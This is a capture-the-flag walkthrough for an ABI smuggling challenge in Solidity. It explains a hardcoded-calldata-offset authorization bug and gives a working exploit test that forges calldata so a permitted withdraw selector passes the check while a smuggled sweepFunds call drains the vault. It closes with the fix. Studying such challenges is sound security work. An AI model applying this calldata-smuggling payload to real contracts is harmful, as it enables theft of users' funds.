## Challenge 15 Walkthrough: ABI Smuggling

### Vulnerability

`AuthorizedExecutor.execute` reads the function selector it authorizes from a **hardcoded calldata offset**, assuming `actionData` always begins there:

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // = 100 (0x64) — assumed start of actionData
    assembly {
        selector := calldataload(calldataOffset)   // ← reads byte 100, not the real actionData
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }

    _beforeFunctionCall(target, actionData);

    return target.functionCall(actionData);  // ← forwards the REAL actionData
}
```

But `actionData` is `bytes calldata`: its true location is determined by an offset pointer in the calldata, which the caller controls. The authorization check reads a fixed position (byte 100) while `functionCall` dispatches whatever the offset pointer actually points to — the two can be made to disagree.

In this challenge the player is permitted only the `withdraw` selector (`0xd9caed12`), while `sweepFunds` (`0x85fb709d`) is reserved for the deployer. `_beforeFunctionCall` only checks `target == address(this)`, so it imposes no further constraint.

### Exploit

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    bytes memory sweepCall = abi.encodeWithSelector(
        vault.sweepFunds.selector, recovery, IERC20(address(token))
    );

    bytes memory payload = abi.encodePacked(
        AuthorizedExecutor.execute.selector,        // [0x00] execute selector
        bytes32(uint256(uint160(address(vault)))),  // [0x04] target = vault
        bytes32(uint256(0x80)),                     // [0x24] actionData offset → 0x80
        bytes32(0),                                 // [0x44] filler word
        bytes4(0xd9caed12),                         // [0x64] AUTHORIZED selector (read by the check)
        bytes28(0),                                 // [0x68] pad the word
        bytes32(sweepCall.length),                  // [0x84] real actionData length
        sweepCall                                   // [0xa4] real actionData = sweepFunds(recovery, token)
    );

    (bool ok,) = address(vault).call(payload);
    require(ok, "smuggled call failed");
}
```

The calldata is hand-built so two regions diverge:

| Calldata offset | Contents | Role |
|-----------------|----------|------|
| `0x24` | `0x80` | `actionData` offset pointer — points *past* the usual slot |
| `0x64` (byte 100) | `0xd9caed12` | the `withdraw` selector the auth check reads |
| `0x84` | length | start of the *real* `actionData` |
| `0xa4` | `sweepFunds(recovery, token)` | the call actually dispatched |

The permission check at byte 100 sees the authorized `withdraw` selector and passes; `functionCall` follows the `0x80` offset pointer to the smuggled `sweepFunds` payload and drains the vault to recovery.

### Why It Works

The authorization layer and the dispatch layer disagree about where `actionData` starts: one reads a fixed byte position, the other honours the ABI offset pointer. By placing an allowed selector at the fixed position while pointing the real payload elsewhere, the attacker authorizes one function and executes another.

The fix is to derive the selector from the same `actionData` that will actually be dispatched — e.g. `bytes4(actionData[:4])` — rather than from a hardcoded calldata offset, so the checked selector and the executed selector can never diverge.

This is a **calldata offset manipulation (ABI smuggling) authorization bypass** — the allowed `withdraw` selector clears the check while a smuggled `sweepFunds` drains all 1M DVT to recovery.
